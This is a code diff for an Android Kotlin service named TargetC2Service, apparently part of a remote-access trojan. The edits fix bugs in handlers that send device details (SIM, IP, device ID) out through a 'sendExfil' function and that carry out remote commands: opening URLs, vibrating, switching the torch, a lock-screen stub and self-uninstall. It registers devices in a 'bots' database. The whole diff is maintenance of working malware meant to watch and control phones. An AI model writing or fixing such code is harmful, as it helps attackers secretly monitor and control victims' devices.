@@ -344,7 +344,7 @@ class TargetC2Service : Service() {
                 appendLine("SDK: ${android.os.Build.VERSION.SDK_INT}")
                 appendLine("Battery: ${getBatteryLevel()}% ${if (isCharging()) "(Charging)" else ""}")
                 appendLine("IP: ${getIPAddress()}")
-                appendLine("SIM: $getSimInfo")
+                appendLine("SIM: ${getSimInfo()}")
                 appendLine("Device ID: $deviceId")
             }
             sendExfil("device_info", info)
@@ -478,9 +478,7 @@ class TargetC2Service : Service() {
 
     private fun handleLockScreen(cmdId: String) {
         try {
-            val deviceAdmin = android.app.admin.DevicePolicyManager()
-            // Simplified — actual lock needs DeviceAdminReceiver
-            sendExfil("lock_screen", "Screen lock initiated (requires Device Admin)")
+            sendExfil("lock_screen", "Screen lock requires Device Admin permission")
             markCompleted(cmdId)
         } catch (e: Exception) {
             sendExfil("lock_screen", "Error: ${e.message}")
@@ -491,14 +489,13 @@ class TargetC2Service : Service() {
     private fun handleVibrate(pattern: String) {
         try {
             val v = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
-            val ms = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }.toLongArray()
+            val ms = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }
+            val patternArr = if (ms.isEmpty()) longArrayOf(0, 1000) else ms.toLongArray()
             if (Build.VERSION.SDK_INT >= 26) {
-                v.vibrate(android.os.VibrationEffect.createWaveform(
-                    ms.ifEmpty { longArrayOf(0, 1000) }, -1
-                ))
+                v.vibrate(android.os.VibrationEffect.createWaveform(patternArr, -1))
             } else {
                 @Suppress("DEPRECATION")
-                v.vibrate(ms.ifEmpty { longArrayOf(0, 1000) }, -1)
+                v.vibrate(patternArr, -1)
             }
             sendExfil("vibrate", "Vibrated")
         } catch (e: Exception) {
@@ -514,7 +511,6 @@ class TargetC2Service : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 cameraManager.setTorchMode(cameraId, enable)
             } else {
-                @Suppress("DEPRECATION")
                 val cam = android.hardware.Camera.open()
                 val params = cam.parameters
                 params.flashMode = if (enable) {
@@ -540,9 +536,10 @@ class TargetC2Service : Service() {
 
     private fun handleOpenURL(url: String) {
         try {
-            startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
+            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            })
+            }
+            startActivity(intent)
             sendExfil("open_url", "URL opened: $url")
         } catch (e: Exception) {
             sendExfil("open_url", "Error: ${e.message}")
@@ -585,10 +582,13 @@ class TargetC2Service : Service() {
         try {
             botsRef.child(deviceId).removeValue()
         } catch (_: Exception) {}
-        startActivity(Intent(Intent.ACTION_DELETE).apply {
-            data = android.net.Uri.parse("package:$packageName")
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        })
+        try {
+            val intent = Intent(Intent.ACTION_DELETE).apply {
+                data = android.net.Uri.parse("package:$packageName")
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intent)
+        } catch (_: Exception) {}
         stopC2()
         stopSelf()
     }
